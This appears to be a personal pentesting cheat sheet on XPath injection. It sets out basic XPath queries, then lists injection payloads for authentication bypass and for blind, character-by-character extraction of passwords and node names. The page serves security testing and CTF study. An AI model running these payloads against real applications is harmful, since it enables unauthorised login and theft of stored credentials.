---
layout: page
title:  "XPath injections"
permalink: "xpath-injections.html"
tags: [security, injections, web]
---
# Introduction
* XPath: XML Path Language. Interpreted language to navigate XML documents.
  XPath expression: sequence of steps required to navigate from one node to another
* XML files used to store applications configuration, and sometimes credentials, roles and privileges
* Single quotes not needed for numeric values
* Keywords and tag names in XML documents are case-sensitive
* Strategy: when regular SQL injections fail, it might be an XPath injection

# Example of queries
* Retrieve all email addresses: `//address/email/text()`
* Retrieve all information under `address` for the user Dawes: `//address[surname/text()='Dawes']`
* Credential verification: `//address[surname/text()='$user' and password/text()='$pass']`
* Access 2nd node of the first user: `//user[position()=1]/child::node()[position()=2]/text()`
* Count the number of nodes of all users: `count(//user/child::node())`
* Length of string: `stringlength(//address/email/text())`
* Substring extraction: `substring(//user/name/text(), start, n_char)`


# Injections
* Testing: `'`, `' or 'a'='a`
* `//address[surname/text()]='Dawes' and password/text()='' or 'a'='a']/ccard/text()`
* Password dump: `' or //address[surname/text()='Dave' and substring(password/text(), 1, 1)= 'A'] and 'a'='a` return results if the first letter or the password is 'A'
* For strings:
  * `' or count(parent::*[position()=1])=0 or 'a'='b`
  * `' or count(parent::*[position()=1])>0 or 'a'='b`
* If numeric:
  * `1 or count(parent::*[position()=1])=0`
  * `1 or count(parent::*[position()=1])>0`
* Current's node parent name:
```
' or substring(name(parent::*[position()=1]), 1, 1) = 'a
' or substring(name(parent::*[position()=1]), 1, 1) = 'b
' or substring(name(parent::*[position()=1]), 2, 1) = 'a
' or substring(name(parent::*[position()=1]), 2, 1) = 'b
' or substring(name(parent::*[position()=1]), 2, 1) = 'c
```
* `substring(//parentnodename[position()=1]/child::node()[position()=1]/text(), 1, 1)='a'`



# Resources
* XPath injection - authentication Root-me solutions
* XPath memo: EN - Introduction to Xpath injection techniques.pdf
* [Xcat tool](https://github.com/orf/xcat)
